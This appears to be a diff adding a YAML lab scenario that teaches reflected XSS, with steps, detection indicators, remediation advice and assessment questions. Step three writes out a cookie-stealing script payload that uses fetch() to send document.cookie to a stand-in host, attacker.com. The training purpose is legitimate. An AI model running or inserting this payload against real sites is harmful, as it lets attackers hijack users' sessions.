@@ -1,0 +1,92 @@
+# Category: Cross-Site Scripting (XSS)
+name: "Reflected XSS in HTML context with no encoding"
+id: "xss-reflected-html-001"
+category: "xss"
+subcategory: "reflected"
+difficulty: "apprentice"
+estimated_time: "30 minutes"
+
+description: |
+  This scenario covers reflected XSS where user input is reflected directly
+  into the HTML response without any encoding or sanitization. The attacker
+  can inject arbitrary HTML/JavaScript that executes in the victim's browser.
+
+learning_objectives:
+  - Understand reflected XSS basics
+  - Identify injection points where input is reflected in the response
+  - Craft a payload to execute JavaScript in the victim's browser
+
+tools:
+  - Burp Suite
+  - curl
+  - Browser developer tools
+
+prerequisites:
+  - Basic understanding of HTML/JavaScript
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify parameters that reflect user input in HTML"
+    commands:
+      - "# Test each parameter with a simple payload"
+      - "parameter=test"
+      - "# Check the response for the echoed value"
+    expected_output: "The parameter value appears in the HTML response"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Inject a JavaScript alert payload"
+    commands:
+      - "# Use payload: <script>alert('XSS')</script>"
+      - "# Send request and observe if alert appears"
+    expected_output: "JavaScript alert executed"
+    detection: "Web server logs may show unusual payloads"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Steal cookies or perform other actions"
+    commands:
+      - "# Payload to steal cookies: <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
+    expected_output: "Cookie sent to attacker's server"
+    detection: "Attacker server logs show incoming requests"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with suspicious script tags"
+  log_indicators:
+    - "Web server logs with unusual parameters"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Encode all user input before rendering (HTML entity encoding)"
+    - "Use context-aware output encoding"
+  long_term:
+    - "Implement a Content Security Policy (CSP)"
+    - "Use a secure template engine"
+
+variables:
+  target_url: "http://example.com/search?q=PAYLOAD"
+
+assessment_questions:
+  - "What is reflected XSS and how does it differ from stored XSS?"
+  - "What encoding should be used for HTML context?"
+  - "How can you test for reflected XSS without breaking the page?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/xss/"
+    title: "OWASP XSS"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    title: "OWASP XSS Prevention"
